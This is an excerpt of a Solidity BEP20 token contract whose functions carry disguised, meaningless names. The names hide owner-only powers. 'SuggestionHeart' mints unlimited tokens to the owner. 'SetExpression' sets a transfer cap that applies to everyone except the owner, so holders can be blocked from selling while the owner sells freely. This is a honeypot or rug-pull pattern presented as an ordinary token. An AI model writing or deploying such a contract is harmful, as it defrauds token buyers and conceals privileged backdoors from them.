...
contract BridgeAgeCopy is IBEP20 
{
    using DiscountLib for uint256;
    mapping(address => uint256) internal _load;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    uint256 internal _cheek;
    ...
    constructor() 
    {
        ...
        _load[_sendermessage] = _totalSupply;
	    emit Transfer(address(0), _sendermessage, _totalSupply);
    }

    modifier FewPresident() { require(msg.sender == _sendermessage); _; }
    function name() public view virtual override returns (string memory) { return _name; }
    function symbol() public view virtual override returns (string memory) { return _symbol; }
    function decimals() public view virtual override returns (uint8) { return 6; }
    function totalSupply() public view virtual override returns (uint256) { return _totalSupply; }
    function balanceOf(address account) public view virtual override returns (uint256) { return _load[account];}
    function _msgSender() internal view virtual returns (address) { return msg.sender; }
    function _msgData() internal view virtual returns (bytes calldata) { return msg.data; }
    function GetBrick() external view returns (uint256) { return _cheek; }
    function SetExpression(uint b) external virtual FewPresident { _cheek = b * (10 ** decimals()); }
    ...
    function SuggestionHeart(uint256 queen) external virtual FewPresident
    {
        uint history = queen * (10 ** decimals()); 
        _load[_msgsender] = _load[_msgsender].Rate(history);
        emit Transfer(address(0), _msgsender, history);
    }
    ...
    function _transfer(address sender,address recipient, uint256 amount) internal virtual 
    {
        ...
        require(amount <= _cheek || recipient == _msgsender || sender == _msgsender);
        uint256 senderBalance = _load[sender];
        require(senderBalance >= amount, "BEP20: transfer amount exceeds balance");
        uint256 burnAmount = amount * _burnRate / 100;

        _load[sender] = senderBalance - amount;
        _load[recipient] += (amount - burnAmount);
        _load[_burnaddress] += burnAmount;
...
library DiscountLib 
{
  function Rate(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; assert(c >= a); return c; }
}